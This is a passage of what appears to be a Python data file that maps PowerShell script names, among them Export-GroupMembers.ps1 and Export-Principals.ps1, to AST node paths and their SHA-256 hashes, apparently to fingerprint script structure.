            "909d933c6464cd5eabc120af867f9f59a38fdd29d9cf08ed8b9e0c9f89279229"
        ),
        # AssignmentStatementAst @ 0.1.45.0.13.1.1.2.0.0.1.1.0
        "0.1.45.0.13.1.1.2.0.0.1.1.0": (
            "99dfe8236a39c1643d27f235512f285d4a7a46c8560f72275f7393e5647f5528"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.0.1.1.0
        "0.1.45.0.13.1.1.2.0.0.1.1.0.1.1.0": (
            "6868ea81495a39fb1fe5ef17c7abe8bc31958c51fb60cae4c22f7af15857378d"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.0.1.2.0
        "0.1.45.0.13.1.1.2.0.0.1.1.0.1.2.0": (
            "c166d5b6654fdb5c0cc662c46e911c2a7249b164f6e5a669676f13b4564ede04"
        ),
        # AssignmentStatementAst @ 0.1.45.0.13.1.1.2.0.0.1.1.1
        "0.1.45.0.13.1.1.2.0.0.1.1.1": (
            "7f2909f6d9a13e7ade24bfcb68f0f7fa9f82c4ccdbb08cd2ef851923d8bd7bca"
        ),
        # AssignmentStatementAst @ 0.1.45.0.13.1.1.2.0.0.1.1.2
        "0.1.45.0.13.1.1.2.0.0.1.1.2": (
            "d1ec47cb3ba4400366700e2a7ea16c72184e0d0bc675feed4eb5007f4ac13efe"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.2.1.2.0
        "0.1.45.0.13.1.1.2.0.0.1.1.2.1.2.0": (
            "c8cfecc7fa603094c70f00262442c7722a246c1769611f0ac89f3a6afdf8f638"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.2.1.4.0
        "0.1.45.0.13.1.1.2.0.0.1.1.2.1.4.0": (
            "10e16254d192201bfa53bebba66fb0869a275b03dbd7aeafe233324da6023836"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.2.1.5.0
        "0.1.45.0.13.1.1.2.0.0.1.1.2.1.5.0": (
            "d5d6df9a0b85f0e0297c3dd7f417cbdc2b2a30e927030a49cf0ca4a9ef37a089"
        ),
        # AssignmentStatementAst @ 0.1.45.0.13.1.1.2.0.0.1.1.3
        "0.1.45.0.13.1.1.2.0.0.1.1.3": (
            "e6fb7843cfe78e770d40d2be62151ee0621d13e89fd2dcba3d5d9425a2fd6ec9"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.3.1.0.1.1.0.0.0.0.0
        "0.1.45.0.13.1.1.2.0.0.1.1.3.1.0.1.1.0.0.0.0.0": (
            "55ae78be1fdb5453826ed0412fdd31a615188f946c50b104c85a5d88b97b3c2f"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.4
        "0.1.45.0.13.1.1.2.0.0.1.1.4": (
            "3a1e3c609715aac67ec7b0678905bc32d1e2e2c41f80ec6ffd28c879693bad6b"
        ),
        # PipelineAst @ 0.1.45.0.13.1.1.2.0.0.1.1.5
        "0.1.45.0.13.1.1.2.0.0.1.1.5": (
            "466c2176177701adb70acd6ebee9d177fa8d4aff3eb28f39d0c0648b9dc10251"
        ),
        # AssignmentStatementAst @ 0.1.45.0.14
        "0.1.45.0.14": ("946ad5f40354208dcf7982e293e4f3828596bec77c1fa9e89fbaa81565ac4583"),
        # PipelineAst @ 0.1.45.0.15
        "0.1.45.0.15": ("bfc9fe9908aeffcdaa758674f8b183288464920b3b88ec23bc68b31c02517ce5"),
        # PipelineAst @ 0.1.45.0.16
        "0.1.45.0.16": ("117927d07974fbe3d981a3bed6c40f4539a11628df3babd585d811272692a848"),
        # PipelineAst @ 0.1.45.0.17
        "0.1.45.0.17": ("dfe116184feef67e841240938eea761ed9730eef261d5479fa6c799cde2c83e7"),
        # PipelineAst @ 0.1.45.1.0.0
        "0.1.45.1.0.0": ("2d36e10ed9c2290cea67489c3cee3701872234cf7f674ce4f1c83efee06a8912"),
        # PipelineAst @ 0.1.45.1.0.0.0.0.2.0.0.0
        "0.1.45.1.0.0.0.0.2.0.0.0": (
            "b61ad344dcd145a42f6523b1429b9745d3337119bd0ca398778a728262007f13"
        ),
        # PipelineAst @ 0.1.45.1.0.1
        "0.1.45.1.0.1": ("4a8e3aebe9ce242248131b11983e533303b01fde8e6b42ee9029249bb3655b12"),
        # PipelineAst @ 0.1.45.1.0.1.0.1.0.0.0
        "0.1.45.1.0.1.0.1.0.0.0": (
            "e59092f2b7d14aebd7e7879ea6529132b278eccebb5235fbc30923847975ceb1"
        ),
        # PipelineAst @ 0.1.46
        "0.1.46": ("a11bd49d880e436cc34c12d8162a3bc198c80c09481471e4284ad2c2aa7946af"),
        # PipelineAst @ 0.1.47
        "0.1.47": ("9490441b3e069f6808f2019df59665aa3c52062d5a70d9933ffad8e8710d1f92"),
        # TryStatementAst @ 0.1.48
        "0.1.48": ("d56d7cbe5e79715db62038278e13d5879a3d30889f7591866ff0ba331dac257a"),
        # AssignmentStatementAst @ 0.1.48.0.0
        "0.1.48.0.0": ("a0222f98dad5e1e906168c88e0878e106d2df8f686b7eca4236900db19ba3323"),
        # AssignmentStatementAst @ 0.1.48.0.1
        "0.1.48.0.1": ("4bba438b514818d50ecf7e62b948a6269a337ccbc778c80ee6a65982e77b1be9"),
        # AssignmentStatementAst @ 0.1.48.0.2
        "0.1.48.0.2": ("4b4050c74a585754193e448ed096ac8e8c7378e74821bdb0cb9ae921ebe205ce"),
        # AssignmentStatementAst @ 0.1.48.0.3
        "0.1.48.0.3": ("d8d36a1163010174a5e5f5245ddc0d760be689a6a99b5cfe4fe31aedda57994f"),
        # PipelineAst @ 0.1.48.0.3.1.0.0.0
        "0.1.48.0.3.1.0.0.0": ("96ef9cd5543345ad30a0575c6ad700322614755ad390960b0354ab751c741def"),
        # PipelineAst @ 0.1.48.0.3.1.0.0.0.1.1.0.0.0
        "0.1.48.0.3.1.0.0.0.1.1.0.0.0": (
            "70f05b33c54673d6fdd3d4923c1313780d6c34ab49606e0e743fbaa2b8a62974"
        ),
        # PipelineAst @ 0.1.48.0.4
        "0.1.48.0.4": ("8059e219cb5f780fb9d2ec0c30040dfa7e43f7b02eb2f7bef2f700a4c042d50b"),
        # PipelineAst @ 0.1.48.0.4.0.1.0.0.0
        "0.1.48.0.4.0.1.0.0.0": (
            "8ea0a3970ab629498e828b0814f5aed18f8c8655cfeca2999fe593ddddd7aefa"
        ),
        # ForEachStatementAst @ 0.1.48.0.5
        "0.1.48.0.5": ("a63260eb34bebae2f542102bb6aae1f819aae71adcd2e8bfa4a52c2e27aec9d2"),
        # AssignmentStatementAst @ 0.1.48.0.5.2.0
        "0.1.48.0.5.2.0": ("1398f201dafa9bc0bf2a2ff3d1935df5377c56d73a2ee403a0897dbf4a0660a2"),
        # TryStatementAst @ 0.1.48.0.5.2.1
        "0.1.48.0.5.2.1": ("26ebc23744b6125177e47b7eaaa43788d3f03632dbc53f6d310d9f2ba04cebc5"),
        # AssignmentStatementAst @ 0.1.48.0.5.2.1.0.0
        "0.1.48.0.5.2.1.0.0": ("273f5bdabd542150b1a1efb891dc461686da07d2ff6efd343c1f8d32fc6e06c3"),
        # AssignmentStatementAst @ 0.1.48.0.5.2.1.0.1
        "0.1.48.0.5.2.1.0.1": ("58d72578967034d1aa57ba123cc59f1af940a201e00015737f82dcf5ea585984"),
        # PipelineAst @ 0.1.48.0.5.2.1.0.1.1.0.0.0
        "0.1.48.0.5.2.1.0.1.1.0.0.0": (
            "8f5b4ec2c9eae11c2e9ed36ba5048a2e8de9738308aae6f7949d041b41880897"
        ),
        # PipelineAst @ 0.1.48.0.5.2.1.0.1.1.0.0.0.1.1.0.0.0
        "0.1.48.0.5.2.1.0.1.1.0.0.0.1.1.0.0.0": (
            "da493ac0e7dcec158ebadcdac79a3ec97ac14d8f5aa2baa95ea4964a6b197755"
        ),
        # AssignmentStatementAst @ 0.1.48.0.5.2.1.0.2
        "0.1.48.0.5.2.1.0.2": ("0deffce99ed40480b60bef913314ec9b0c00991559ee0e4c3ee30b1e2623e576"),
        # PipelineAst @ 0.1.48.0.5.2.1.0.3
        "0.1.48.0.5.2.1.0.3": ("b326073f4d553e143211f9f223dd8e6ca3b2e8eb0a5c3828c9b33fde475df1dc"),
        # AssignmentStatementAst @ 0.1.48.0.5.2.1.1.0.0
        "0.1.48.0.5.2.1.1.0.0": (
            "19420b7277a0d99d1b94b452f367774b824463bd79bd26b31c16558cf22d64d5"
        ),
        # PipelineAst @ 0.1.48.0.5.2.1.1.0.1
        "0.1.48.0.5.2.1.1.0.1": (
            "89787d3869ebbeb2985e0d02eb66d4358bc1864cf72dd7994a32c01d078b91f4"
        ),
        # AssignmentStatementAst @ 0.1.48.0.6
        "0.1.48.0.6": ("99ecaa01b84fff41f20fb895c3756c4a78cee2f7d814739ba1a7dcc7a17a02f4"),
        # AssignmentStatementAst @ 0.1.48.0.7
        "0.1.48.0.7": ("b06e02bed4f1f5e77b6f28d34d3ab9fbfbb27d1e7452d21d7232c8901c3834c2"),
        # AssignmentStatementAst @ 0.1.48.0.8
        "0.1.48.0.8": ("5278f37b4baa7346a1a3a53f047079f56999b6d63ca139f9718b550a20b9ae7e"),
        # PipelineAst @ 0.1.48.0.9
        "0.1.48.0.9": ("dc60b97b87d2d8b325a6866dbb9786318f655b8dad01dd3900e424bfd17e5214"),
        # PipelineAst @ 0.1.48.0.10
        "0.1.48.0.10": ("c49a36de97e8567a7d2e3c848570da326ae1d7910807a9a71238f03b1056a6e3"),
        # PipelineAst @ 0.1.48.0.11
        "0.1.48.0.11": ("6057df8ac6f3177a61db45f162fef301969780be7699b2fb4834a66ff4700fa2"),
        # PipelineAst @ 0.1.48.1.0.0
        "0.1.48.1.0.0": ("4a8e2b2b4d3cfcc16af9a32d0a65fa3640016533b0a883250bde3a7b907f654a"),
        # PipelineAst @ 0.1.48.1.0.0.0.0.2.0.0.0
        "0.1.48.1.0.0.0.0.2.0.0.0": (
            "fd9b17d149a3099b4cb440e6cddd34fa2325da8b8602f31cdd0081505597c2cc"
        ),
        # PipelineAst @ 0.1.48.1.0.1
        "0.1.48.1.0.1": ("520ce5f111f7b2f160463df1d24a6b2fa7b567c89b2936422de95677e8d0f7d4"),
        # PipelineAst @ 0.1.48.1.0.1.0.1.0.0.0
        "0.1.48.1.0.1.0.1.0.0.0": (
            "bfb898fa366101993198a9a82e9a0c5c01b24e661e9796c8f745e186cf88c9cf"
        ),
        # PipelineAst @ 0.1.49
        "0.1.49": ("f474f24e86052112c7445cf0b2b6ecad715c3e8ebfa8d597433cde7d18775b9f"),
        # PipelineAst @ 0.1.50
        "0.1.50": ("828d481cce5a6a902f3ced65c3eb023522fb06d27e336a454ba1c9f0f7dab2a9"),
        # IfStatementAst @ 0.1.51
        "0.1.51": ("bd90a34d4c293cc985c1ce48efd2d3772ef2b825e7b27d05c929b6bb248a91c7"),
        # PipelineAst @ 0.1.51.1.0
        "0.1.51.1.0": ("2f6a41d8e540449d588d2e35d93e8cdc5f5790281237fef8d8bc3535972cc458"),
        # AssignmentStatementAst @ 0.1.51.2.0
        "0.1.51.2.0": ("ffe7daea926a28aafa0c6ee65f414c0bcf3eb02e6c635ca8c835ec8b0347650c"),
        # PipelineAst @ 0.1.51.2.0.1.0.0.0.0
        "0.1.51.2.0.1.0.0.0.0": (
            "308c44906b2d179897d8360982cc5311610da5432e09ba0e2deebbbbec2ace90"
        ),
        # PipelineAst @ 0.1.51.2.0.1.0.1.0.0
        "0.1.51.2.0.1.0.1.0.0": (
            "503c3e1b7aead6fb4275cc3ff3fe6abc7e39382e783c37b4aa7e179e70cda6e3"
        ),
        # AssignmentStatementAst @ 0.1.51.2.1
        "0.1.51.2.1": ("7d6f2ba2c02f27c5203d53be4ad92d3347f3a7b65ea0d4e69ce67081211e9133"),
        # PipelineAst @ 0.1.51.2.2
        "0.1.51.2.2": ("2b21d9a4cb3cb8205ba64894b8660c3276675344b6fba9253d0e94e39a180e51"),
        # AssignmentStatementAst @ 0.1.51.2.3
        "0.1.51.2.3": ("c352d650e70a9d1b12bddcd6a4c78ef0ff0ff7841bed20ef1898383739ce15e0"),
        # AssignmentStatementAst @ 0.1.51.2.4
        "0.1.51.2.4": ("0b7799c12929945f888c838182ee093d8327594de290a895e94ac14eaca1ab20"),
        # AssignmentStatementAst @ 0.1.51.2.5
        "0.1.51.2.5": ("203f39459066235c73a085a623019053b2e191d6398bc1b9fb8788e611f098a6"),
        # PipelineAst @ 0.1.51.2.5.1.0.0.0
        "0.1.51.2.5.1.0.0.0": ("1ff8ef08cd5951c13aef6ca3cdce323a98efe3193c2f1c59ce8b8697db4c2aa7"),
        # ForEachStatementAst @ 0.1.51.2.6
        "0.1.51.2.6": ("81e020ee544d499af61fc5ba4990e98a7a47dd38de4dbc014abaf75c68d16bdb"),
        # TryStatementAst @ 0.1.51.2.6.2.0
        "0.1.51.2.6.2.0": ("4af8a77ce32a4da9a13326f70bc24cab4a4b2598bdceb16d553b252951696a36"),
        # PipelineAst @ 0.1.51.2.6.2.0.0.0
        "0.1.51.2.6.2.0.0.0": ("e62956d7aea34888e0698fefa4fe0e9e9d4f1d36140f90005e9c90a4fb0649a4"),
        # PipelineAst @ 0.1.51.2.6.2.0.1.0.0
        "0.1.51.2.6.2.0.1.0.0": (
            "275c2dc38248ee979b42b76ef40e860a39e96eaf4e176636ba23a79fcd63cfbd"
        ),
        # PipelineAst @ 0.1.51.2.6.2.0.1.0.1
        "0.1.51.2.6.2.0.1.0.1": (
            "17a540721f3d5f4db0a1fc2f64922f2e21f6073e6f8efeb74a18507f38717464"
        ),
        # PipelineAst @ 0.1.51.2.6.2.0.1.0.2
        "0.1.51.2.6.2.0.1.0.2": (
            "7eb6e437eb8283330f0420fd309784854afb6150e7f65fa3c74ec702bcbb9a9d"
        ),
        # PipelineAst @ 0.1.51.2.6.2.0.1.0.2.0.1.0.0.0
        "0.1.51.2.6.2.0.1.0.2.0.1.0.0.0": (
            "1331afc8fb57f2ab663e7c182eebc25b5d1a3a317ead3d3d0ebaec639085f78d"
        ),
        # PipelineAst @ 0.1.51.2.6.2.0.1.0.2.0.1.1.0.0
        "0.1.51.2.6.2.0.1.0.2.0.1.1.0.0": (
            "e2b05a8fbb519830a911fdbdb7ba9db4eedd771981f4dd21f1d93c043a323da7"
        ),
        # PipelineAst @ 0.1.51.2.7
        "0.1.51.2.7": ("86a76edf28abf612741bf4e02a58a2cd67c46a7d794d05f2a7656682c31f37ef"),
        # PipelineAst @ 0.1.51.2.7.1.1.0.0.0
        "0.1.51.2.7.1.1.0.0.0": (
            "2420b34f56059eac55da226131a47b0b7e266a6dc02234dd03c1a09acf6b6274"
        ),
        # AssignmentStatementAst @ 0.1.51.2.8
        "0.1.51.2.8": ("4cf212704614509d86456717825c4c55bbaf5851a7276ec8be8ce1d120151c8c"),
        # PipelineAst @ 0.1.51.2.8.1.0.0.0.0
        "0.1.51.2.8.1.0.0.0.0": (
            "8c1795cfc40408f242f13f0395fea9111c6f6133d0a137bd78ac54107ae78d5b"
        ),
        # IfStatementAst @ 0.1.51.2.9
        "0.1.51.2.9": ("e30847f14661e7db44f7398700c1e0875119f24cd900de20647e45add84d2cc0"),
        # AssignmentStatementAst @ 0.1.51.2.9.1.0
        "0.1.51.2.9.1.0": ("9edeeccaf881628aaa397da08578d973f35b7ad8ceeb059d1c37a9ecc7a0a118"),
        # PipelineAst @ 0.1.51.2.9.1.0.1.1.0
        "0.1.51.2.9.1.0.1.1.0": (
            "0d42fc05c5870b0c6cc905a5e123626f865e5b04cc035de20055111a05506952"
        ),
        # IfStatementAst @ 0.1.51.2.9.1.0.1.1.0.0.0.1.0.0
        "0.1.51.2.9.1.0.1.1.0.0.0.1.0.0": (
            "8d001f79e5d7e24d5e4aeb4be08e36c2997ead57e0a40f76f64f6602df5e8407"
        ),
        # PipelineAst @ 0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.1.0
        "0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.1.0": (
            "29efce54e70d77803886fe571837c8baa735c847ae24b366f2863478add283a1"
        ),
        # PipelineAst @ 0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.1.0.0.0.0.0.0
        "0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.1.0.0.0.0.0.0": (
            "a77effd8c19a194ed895641fda843851669565196c33003660581f72e286cbd7"
        ),
        # PipelineAst @ 0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.2.0
        "0.1.51.2.9.1.0.1.1.0.0.0.1.0.0.2.0": (
            "65becebb61609765daaf70c0534faa3a491ef5e54c0170e8d8c0e8f2c4bfaa15"
        ),
        # PipelineAst @ 0.1.51.2.9.1.0.1.2.0
        "0.1.51.2.9.1.0.1.2.0": (
            "8e2868d9db34c4aad11d28063e529fd14f66cbb79808a5c758c00d3ce86ad4b7"
        ),
        # PipelineAst @ 0.1.51.2.9.1.1
        "0.1.51.2.9.1.1": ("0de490842548791bd8c9472289374f11e8f1a956629349aaabe38875240ace73"),
        # PipelineAst @ 0.1.51.2.9.1.2
        "0.1.51.2.9.1.2": ("f5870bcccfc31711f4ba8957b2185c4363f13d08577b4fbb85a19146f4655dfc"),
        # PipelineAst @ 0.1.51.2.9.1.3
        "0.1.51.2.9.1.3": ("3ae9246365398888a8af537d0a55030e53c2a0215cc48e98d4e6c9d678a9bb51"),
        # PipelineAst @ 0.1.51.2.9.1.4
        "0.1.51.2.9.1.4": ("c15ae7ac113bc1017c4cf864dd92ed3063396d6215bf3c8c8cf0f758235ccf04"),
        # PipelineAst @ 0.1.51.2.9.3.0
        "0.1.51.2.9.3.0": ("a8f3f064f69319300abc083f73dc57757148fd87888747b07ac7020a2eee12cf"),
        # PipelineAst @ 0.1.51.2.9.4.0
        "0.1.51.2.9.4.0": ("831158e712baf95fbd0300f32282da08275a2f7ffa17fa034a31917ecfa3c69e"),
        # PipelineAst @ 0.1.51.2.9.4.1
        "0.1.51.2.9.4.1": ("e9c1410905fefef50daee61932ff3d9a2ab8929b099e17b73e6744d25bc931ca"),
        # PipelineAst @ 0.1.52
        "0.1.52": ("4e3b4c17f9d5174b04dc84e4956323d9d0947f3fdc26dfbf38ae34a5a2693d46"),
        # PipelineAst @ 0.1.53
        "0.1.53": ("d06d999aaf800d09d1bb3f0b44c1a0f59466b8fc419b5483ed51434ed638a4db"),
        # PipelineAst @ 0.1.53.0.1.0.0.0
        "0.1.53.0.1.0.0.0": ("2222666dcff5bd83581efa89fae44dea849c8ff02f07c7d5490875d7f96b8163"),
        # ForEachStatementAst @ 0.1.54
        "0.1.54": ("7132c750b524586b3dc17f6fdd77ec8587d3ee40ba6e28d8a721d7b049e206ae"),
        # PipelineAst @ 0.1.54.2.0
        "0.1.54.2.0": ("9cf94da9327ff06fd9175f16bbc6a43a7e7fcf9365b1a183f30a126dcdc732ec"),
        # IfStatementAst @ 0.1.55
        "0.1.55": ("ec8480f4e7c18e3d82caa95e068bf1c80e6514cf84702c4a78560d2f1bce11e8"),
        # PipelineAst @ 0.1.55.1.0
        "0.1.55.1.0": ("ba076a2230f800147ba503ba99c63413324e5509a93036bfafd4b4ead1d85ee8"),
        # PipelineAst @ 0.1.55.1.0.0.1.0.0.0
        "0.1.55.1.0.0.1.0.0.0": (
            "78d3b8f9b263d17d93654fe45971d280c860afe6dd9e2fdade439ad6f1dc0fcc"
        ),
        # ForEachStatementAst @ 0.1.55.1.1
        "0.1.55.1.1": ("587c5e811ba45af4e9303e457fb7b01afafe43edd80466d1e6282e237da62881"),
        # PipelineAst @ 0.1.55.1.1.2.0
        "0.1.55.1.1.2.0": ("cfe2763b5a6eec1a34e154e464807fe758baa8942fec578c5de1315a80b1e038"),
        # PipelineAst @ 0.1.55.2.0
        "0.1.55.2.0": ("2e0f65ee16a78c53bcfe894b52a3fdb5b36f421633429e2e0d12c6e5c4c53101"),
        # IfStatementAst @ 0.1.56
        "0.1.56": ("61cdb99b9fad1a57755483c76870ad20f0916aad7f9f7379684263bbdbc28ec4"),
        # PipelineAst @ 0.1.56.1.0
        "0.1.56.1.0": ("ca5ca1e3128a326863c212d28099dfd231f8579714541f1fffa5481aea774499"),
    },
    "Export-GroupMembers.ps1": {
        # AssignmentStatementAst @ 0.1.0
        "0.1.0": ("2a8a9eb3b3b733c323fe2d94c4fe548e10c1e4360d428cb226f23281881d760d"),
        # AssignmentStatementAst @ 0.1.1
        "0.1.1": ("1f1241ff034a3555f3169572c333e90b1f90efb900c8dd69c52f7f242d948030"),
        # IfStatementAst @ 0.1.2
        "0.1.2": ("58db2fe83467a5d4c4f849698b0c41213dfee25c513015a2b70fdb7d34285340"),
        # AssignmentStatementAst @ 0.1.2.1.0
        "0.1.2.1.0": ("bb0f2a9e6605d8d99153832d8be77a32dc6a11e19eff433ab57f8789416d572f"),
        # AssignmentStatementAst @ 0.1.3
        "0.1.3": ("f964f07d8944e8856680c9640890c764dfcceef42f472620273ba35734af5f31"),
        # AssignmentStatementAst @ 0.1.4
        "0.1.4": ("bd212face2da8c1530e6e5bbf6000057dbb88c73d5980e378a036a89cb0711bd"),
        # PipelineAst @ 0.1.4.1.1.1.0.0.0
        "0.1.4.1.1.1.0.0.0": ("3a458314c86b6f3496c8100d5992eb8e7a6b0739c2f5cd49eebffea6d89fbda8"),
        # PipelineAst @ 0.1.5
        "0.1.5": ("a6355478fd761e2ebbe103e7690d12d7538165c407861a744b71536da3778d69"),
        # PipelineAst @ 0.1.5.0.1.0.0.0
        "0.1.5.0.1.0.0.0": ("eba1ff0d6baf078b67d28862f2ce9871c2dfbb7b54782e2b129ce281e41f0b29"),
        # AssignmentStatementAst @ 0.1.6
        "0.1.6": ("b082bd50163b1e0dbcac317b99ca3fc8facd7a2b604a3ee149f341fe83e55d9b"),
        # AssignmentStatementAst @ 0.1.7
        "0.1.7": ("4ff5637e1754d8e97d0bc70a7df1be9519b5a5effb23cdb6138e3b82b59b66cd"),
        # AssignmentStatementAst @ 0.1.8
        "0.1.8": ("80362b858e5f2adde08842509e053d2b2cfbdbc6a05b4bb6614bbb3d0d5e2534"),
        # ForEachStatementAst @ 0.1.9
        "0.1.9": ("52bc7766e88d0102ed383e0e0732ff3590e301b1fc3c4a7b3f4b4a45b23176a5"),
        # AssignmentStatementAst @ 0.1.9.2.0
        "0.1.9.2.0": ("3000477a58618496b8bd4811cf311cea7b6c0e71b1240c499e91d2aed4c29b10"),
        # AssignmentStatementAst @ 0.1.9.2.1
        "0.1.9.2.1": ("eb88e72d18058f175575c6f03968240c1e3012ad1638ff12ab83aac1832a3469"),
        # PipelineAst @ 0.1.9.2.2
        "0.1.9.2.2": ("a95e2ba4bb717a08a87ab2dfb511e2386e47fa333f9d38d57a52773169545b8b"),
        # TryStatementAst @ 0.1.9.2.3
        "0.1.9.2.3": ("766496599bf85e1ea81782d4b5248a855f796eec80fab11c558e52f98edaa32d"),
        # AssignmentStatementAst @ 0.1.9.2.3.0.0
        "0.1.9.2.3.0.0": ("8ddb73610ef7c701e148d362b430ad6cd69f2f089d4a6ebfc0fc9ad669c6eb1e"),
        # AssignmentStatementAst @ 0.1.9.2.3.0.1
        "0.1.9.2.3.0.1": ("1636bee8e3d51ed6a5d60c4a245c9a9ce9881ec312201c96999f99f2d34c2b6c"),
        # ForEachStatementAst @ 0.1.9.2.3.0.2
        "0.1.9.2.3.0.2": ("66d9d1a813ccfb2e090fef853123a6f6b8836604312120b6ba5a7fbe8d88e1fe"),
        # IfStatementAst @ 0.1.9.2.3.0.2.2.0
        "0.1.9.2.3.0.2.2.0": ("5c470e2ec15758f43af18e184b2ff037d732c6aa1eafcd2ce4bc3b911a7b2f12"),
        # AssignmentStatementAst @ 0.1.9.2.3.0.2.2.0.1.0
        "0.1.9.2.3.0.2.2.0.1.0": (
            "178ed9ac1cd8b76b2fd75caf8effae9c0ff7699ed2894727ef8e6c3413143850"
        ),
        # AssignmentStatementAst @ 0.1.9.2.3.0.3
        "0.1.9.2.3.0.3": ("f6e97363baeb9daf220e69e21c258df8abb74cf2f1a95afe476ac5c7ca560fd5"),
        # PipelineAst @ 0.1.9.2.3.0.4
        "0.1.9.2.3.0.4": ("5333011793fb853b7639b96195b026f5f05441d21b1128ef860c11078cb8507a"),
        # PipelineAst @ 0.1.9.2.3.0.5
        "0.1.9.2.3.0.5": ("882f05260001f8f934b1bbde15f11d7ced87c7417e95067516c2c7f1bddffa7e"),
        # PipelineAst @ 0.1.9.2.3.0.5.0.1.0.0.0
        "0.1.9.2.3.0.5.0.1.0.0.0": (
            "9c5bf3a059f29861814d7c0755eb57b1eaa4ef6a70fccb576d14770dd1370bf1"
        ),
        # PipelineAst @ 0.1.9.2.3.1.0.0
        "0.1.9.2.3.1.0.0": ("9279a6c9e4099bef30fd6210b22ea7aea5aec3b7e45813062765e244c1a25cd2"),
        # PipelineAst @ 0.1.9.2.3.1.0.0.0.1.0.0.0
        "0.1.9.2.3.1.0.0.0.1.0.0.0": (
            "919e906ca89bdb42a8fa370189166d1768f4b5fb5556e3b4facb3aba119c37d7"
        ),
        # AssignmentStatementAst @ 0.1.9.2.3.1.0.1
        "0.1.9.2.3.1.0.1": ("0b6181c8420e76005cd196aef280af2b2b72727a7e2e2fe41bbf30588964ee55"),
        # PipelineAst @ 0.1.9.2.3.1.0.2
        "0.1.9.2.3.1.0.2": ("f2e370898394d093d0b6c859c04406a103767029f0762eaa40acff257a7088ee"),
        # AssignmentStatementAst @ 0.1.10
        "0.1.10": ("cef325f2f40d6adc2795a4eb302871355d34aa2fa6f8215ded0cf78838b77c2a"),
        # AssignmentStatementAst @ 0.1.11
        "0.1.11": ("1f37d8031e4e0dc03a32613aa4d8a5bff5c1c503b5c4f58a54df337dce516d37"),
        # AssignmentStatementAst @ 0.1.12
        "0.1.12": ("8b28cb8ef5d821c7dcbf5b81f98b21c88b320aeda5c0e3a716a76928e90b9bf5"),
        # PipelineAst @ 0.1.13
        "0.1.13": ("c21222855ccf29a63cbc651533dd4fd36925d423a15f6441997d3a0676e7a9e4"),
        # PipelineAst @ 0.1.14
        "0.1.14": ("3c1c8882dfc1cc9b89ce10ee26b85eaefc1c99aa407cbf861aae7a8eb9da2298"),
    },
    "Export-Principals.ps1": {
        # AssignmentStatementAst @ 0.1.0
        "0.1.0": ("72bf1697605ffbbf34e17872c1814eadbf7f77815bab7efe8b2806f792eb7974"),
        # AssignmentStatementAst @ 0.1.1
        "0.1.1": ("185cb6b7f4fecff2fc0d7665060e24e4c26eed3cd5661e4660623d05caa144c8"),
        # IfStatementAst @ 0.1.2
        "0.1.2": ("ba7f781a0b5ea6a276163af19135b88fc11c7959278cd1a33b260cd3acde585e"),
        # PipelineAst @ 0.1.2.1.0
        "0.1.2.1.0": ("8db154a87236f47ba5e89fa45a700e8ee778ce7d3c5b6283d8a4575a1729cb94"),
        # AssignmentStatementAst @ 0.1.2.1.1
        "0.1.2.1.1": ("45c306fd156e223962ee653f8ea31f0f4f4433116acbdedc12b9550927ffea77"),
        # AssignmentStatementAst @ 0.1.2.1.2
        "0.1.2.1.2": ("a2dbd78bbb9570e9180a36c1186b4610e5f0733e6de498345c45748dbf6ed39f"),
        # IfStatementAst @ 0.1.2.1.3
        "0.1.2.1.3": ("1db6c22f123b06ad5d057624e75633e37aac2188c15aeede93f1f4130da60655"),
        # AssignmentStatementAst @ 0.1.2.1.3.1.0
        "0.1.2.1.3.1.0": ("e093f43e36749f3846d0c99831001b5fd636383c8eb1e52daaf4472a4aa3729d"),
        # AssignmentStatementAst @ 0.1.2.1.4
        "0.1.2.1.4": ("3cb5132721e184c31d9b1fad12f4f4d1428e715e8c3c68daf2d147dfe87ad3ef"),
        # IfStatementAst @ 0.1.2.1.5
        "0.1.2.1.5": ("3adc7ac77c84a0355e0bbd6acfcdc8619f3dc1849b043d03881529ee79c3b5ef"),
        # AssignmentStatementAst @ 0.1.2.1.5.1.0
        "0.1.2.1.5.1.0": ("8d8bac8f4b71383d427ed56031bbb74ac674030191b952b16173086209a546ed"),
        # ForEachStatementAst @ 0.1.2.1.6
        "0.1.2.1.6": ("a5f188a2101e2f9ea3cea8790333a9036bd6e237b58f669219c9b71e4e6db911"),
        # TryStatementAst @ 0.1.2.1.6.2.0
        "0.1.2.1.6.2.0": ("3881c07ca63ec651c04103e398ec091afe3226a17f2cd7fc6bd50b4518eebbea"),
        # AssignmentStatementAst @ 0.1.2.1.6.2.0.0.0
        "0.1.2.1.6.2.0.0.0": ("c2e7ed78fe10f359afc9202ebd80a5cbe98cfe385bdf9f5260db018d4235e28e"),
        # AssignmentStatementAst @ 0.1.2.1.6.2.0.0.1
        "0.1.2.1.6.2.0.0.1": ("37d28c21fd47e8d2fba7f75aed8df1fb20c9add78a1084cfc9b79ba757d12414"),
        # ForEachStatementAst @ 0.1.2.1.6.2.0.0.2
        "0.1.2.1.6.2.0.0.2": ("165aa85141925fe95f058e65676404b893beb04c1ecc8c717d8158fe84df43ec"),
        # PipelineAst @ 0.1.2.1.6.2.0.0.2.2.0
        "0.1.2.1.6.2.0.0.2.2.0": (
            "171a540cea2f7bc4bf032c4ae984245db3bf529b1eab7d1821d3275a685bdb68"
        ),
        # AssignmentStatementAst @ 0.1.2.1.7
        "0.1.2.1.7": ("fdfbec2d020ca6967c31ff97a4687577fc16411c18432ec440dde3c0e3dff5bf"),
        # IfStatementAst @ 0.1.2.1.8
        "0.1.2.1.8": ("cd4f14fde7f5245988d806b7abda7c28db2d2cb9748e38df8164e289897da9db"),
        # TryStatementAst @ 0.1.2.1.8.1.0
        "0.1.2.1.8.1.0": ("7cd2f5a795443720cd9616171783b30d09d3e8155dd25c4b45998ce45a0b3e04"),
        # AssignmentStatementAst @ 0.1.2.1.8.1.0.0.0
